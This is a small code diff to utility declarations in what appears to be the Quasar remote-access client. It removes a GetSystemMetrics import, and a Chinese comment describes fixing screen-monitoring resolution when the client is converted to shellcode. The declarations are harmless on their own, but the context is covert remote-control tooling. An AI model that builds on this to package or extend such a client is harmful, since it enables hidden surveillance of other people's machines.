@@ -20,7 +20,7 @@ namespace Quasar.Client.Utilities
 
         /*
         * 修复转为shellcode时屏幕监控分辨率问题
-        * 增加GetDeviceCaps、GetDC、GetSystemMetrics、ReleaseDC的原生API
+        * 增加GetDeviceCaps、GetDC、ReleaseDC的原生API
         */
 
         [DllImport("gdi32.dll")]
@@ -31,9 +31,6 @@ namespace Quasar.Client.Utilities
 
         [DllImport("User32.dll", EntryPoint = "GetDC")]
         public extern static IntPtr GetDC(IntPtr hWnd);
-
-        [DllImport("user32.dll")]
-        public static extern int GetSystemMetrics(int nIndex);
 
         [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
         internal static extern IntPtr LoadLibrary(string lpFileName);
